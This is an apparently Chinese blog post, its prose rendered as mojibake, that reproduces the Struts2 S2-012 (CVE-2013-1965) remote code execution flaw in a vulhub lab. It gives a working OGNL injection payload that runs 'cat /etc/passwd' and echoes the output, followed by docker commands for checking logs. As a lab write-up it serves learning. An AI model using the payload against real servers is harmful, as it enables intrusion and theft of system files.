# CVE-2013-1965 S2-012 å¤ç° - ç¾å¼åŠ ç³– - åšå®¢å›­

> åŸæ–‡ï¼š[`www.cnblogs.com/peace-and-romance/p/15635486.html`](https://www.cnblogs.com/peace-and-romance/p/15635486.html)

### 0X00-å¼•è¨€

* * *

å­¦ä»€ä¹ˆæ¸—é€ï¼Œä¸å½’è·¯ç½¢äº†ğŸ™‚ï¼Œä¸Šå®Œå¤§å­¦å›å®¶å…»çŒªğŸ·å®ƒä¸é¦™å—

### 0X01-ç¯å¢ƒæ­å»º

* * *

é¶æœºï¼šCentOS Linux 7

æ”»å‡»æœºï¼šwindows server 2016 && Kail

ç¯å¢ƒï¼švulhub

é¡¹ç›®åœ°å€ï¼š[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

æ­å»º vulhub è¯·è®¿é—®ï¼š[ç©ºç™½ centos7 64 æ­å»º vulhub(è¯¦ç»†)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-æ¼æ´æè¿°

* * *

å¦‚æœåœ¨é…ç½® Action ä¸­ Result æ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨ ${param_name} ä½œä¸ºé‡å®šå‘å˜é‡ï¼Œä¾‹å¦‚ï¼š

```
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package> 
```

è¿™é‡Œ UserAction ä¸­å®šä¹‰æœ‰ä¸€ä¸ª name å˜é‡ï¼Œå½“è§¦å‘ redirect ç±»å‹è¿”å›æ—¶ï¼ŒStruts2 è·å–ä½¿ç”¨ ${name} è·å–å…¶å€¼ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå¯¹ name å‚æ•°çš„å€¼æ‰§è¡Œ OGNL è¡¨è¾¾å¼è§£æï¼Œä»è€Œå¯ä»¥æ’å…¥ä»»æ„ OGNL è¡¨è¾¾å¼å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚

å½±å“ç‰ˆæœ¬: 2.1.0 - 2.3.13

### 0X03-æ¼æ´å¤ç°

* * *

##### 01-ä»»æ„å‘½ä»¤æ‰§è¡Œ

S2-001 çš„å›æ˜¾ POC

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} 
```

ç›´æ¥æ”¾å…¥è¡¨å•æ¡†å†…-æäº¤

![image-20211202095954549](img/42d3e35d2f9a5c36df9d716f1a72441c.png)

![image-20211202100015521](img/5009bd8342e9e7e330066e3051cdb6d1.png)

æŠ“åŒ…åªæ˜¯å› ä¸ºçœ‹ç€èˆ’æœ

![image-20211202095813237](img/319fdb206632ce3c26523a7cd4fd8fff.png)

### 0X04-æ¼æ´åˆ†æ

* * *

ä¸€æ—¶åŠä¼šåˆ†æä¸å‡ºæ¥ï¼Œç­‰æˆ‘çœ‹æ‡‚äº†æºç å†æ¥åˆ†æ

### 0X05-æŸ¥çœ‹æ—¥å¿—

```
docker ps #æŸ¥çœ‹å®¹å™¨ ID
docker exec -it ID /bin/bash #è¿›å…¥
cd logs #è¿›å…¥æ—¥å¿—ç›®å½•
cat localhost_access_log.2021-12-02.txt #æŸ¥çœ‹æ—¥å¿—
exit #é€€å‡ºå®¹å™¨ 
```

![image-20211202101248023](img/788739ceb0d07e9aa18834d4e5b3c181.png)

### 0X06-å‚è€ƒ

[S2-012 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´](https://github.com/vulhub/vulhub/blob/master/struts2/s2-012/README.zh-cn.md)